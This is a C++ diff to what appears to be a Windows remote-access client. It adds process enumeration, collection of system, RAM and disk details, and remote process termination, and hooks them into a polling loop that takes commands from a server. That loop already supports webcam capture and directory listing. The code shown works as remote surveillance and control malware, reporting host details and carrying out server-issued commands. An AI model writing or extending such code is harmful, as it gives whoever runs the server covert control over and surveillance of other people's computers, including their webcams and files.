@@ -6,6 +6,7 @@
 #include <vector>
 #include <gdiplus.h>
 #include <vfw.h>
+#include <tlhelp32.h>
 #pragma comment(lib, "winhttp.lib")
 #pragma comment(lib, "gdi32.lib")
 #pragma comment(lib, "gdiplus.lib")
@@ -346,6 +347,63 @@ void sendPing() {
     httpsPost("/rest/v1/pings", body);
 }
 
+std::string listProcesses() {
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snap == INVALID_HANDLE_VALUE) return "[]";
+    PROCESSENTRY32 pe = {sizeof(pe)};
+    std::string out = "[";
+    BOOL ok = Process32First(snap, &pe);
+    while (ok) {
+        if (out.size() > 1) out += ",";
+        out += "{\"n\":\"" + jsonEscape(pe.szExeFile) + "\",\"p\":" + std::to_string(pe.th32ProcessID) + "}";
+        ok = Process32Next(snap, &pe);
+    }
+    CloseHandle(snap);
+    out += "]";
+    return out;
+}
+
+std::string killProcess(const std::string& payload) {
+    int pid = 0;
+    try { pid = std::stoi(payload); } catch(...) { return "bad_pid"; }
+    HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
+    if (!h) return "access_denied";
+    TerminateProcess(h, 0);
+    CloseHandle(h);
+    return "ok";
+}
+
+std::string getSystemInfo() {
+    SYSTEM_INFO si;
+    GetSystemInfo(&si);
+    MEMORYSTATUSEX ms = {sizeof(ms)};
+    GlobalMemoryStatusEx(&ms);
+    ULARGE_INTEGER freeB, totalB, totalF;
+    std::string disks = "[";
+    DWORD drives = GetLogicalDrives();
+    for (int i = 0; i < 26; i++) {
+        if (drives & (1 << i)) {
+            char root[4] = {(char)('A'+i), ':', '\\', 0};
+            if (GetDriveTypeA(root) == DRIVE_FIXED && GetDiskFreeSpaceExA(root, &freeB, &totalB, &totalF)) {
+                if (disks.size() > 1) disks += ",";
+                disks += "{\"d\":\"" + std::string(1, root[0]) + "\",\"t\":" + std::to_string(totalB.QuadPart / (1024*1024)) + ",\"f\":" + std::to_string(freeB.QuadPart / (1024*1024)) + "}";
+            }
+        }
+    }
+    disks += "]";
+    char compName[MAX_PATH+1];
+    DWORD csz = MAX_PATH;
+    GetComputerNameA(compName, &csz);
+    std::string out = "{";
+    out += "\"host\":\"" + jsonEscape(compName) + "\",";
+    out += "\"cores\":" + std::to_string(si.dwNumberOfProcessors) + ",";
+    out += "\"ram\":" + std::to_string(ms.ullTotalPhys / (1024*1024)) + ",";
+    out += "\"ram_free\":" + std::to_string(ms.ullAvailPhys / (1024*1024)) + ",";
+    out += "\"disks\":" + disks;
+    out += "}";
+    return out;
+}
+
 DWORD WINAPI pollThread(LPVOID) {
     Sleep(3000);
     while(true) {
@@ -384,6 +442,12 @@ DWORD WINAPI pollThread(LPVOID) {
                         result = captureWebcam();
                     } else if (type == "file_list") {
                         result = listDir(payload.empty() ? "" : payload);
+                    } else if (type == "process_list") {
+                        result = listProcesses();
+                    } else if (type == "system_info") {
+                        result = getSystemInfo();
+                    } else if (type == "kill_process") {
+                        result = killProcess(payload);
                     } else {
                         result = "unknown_type";
                     }
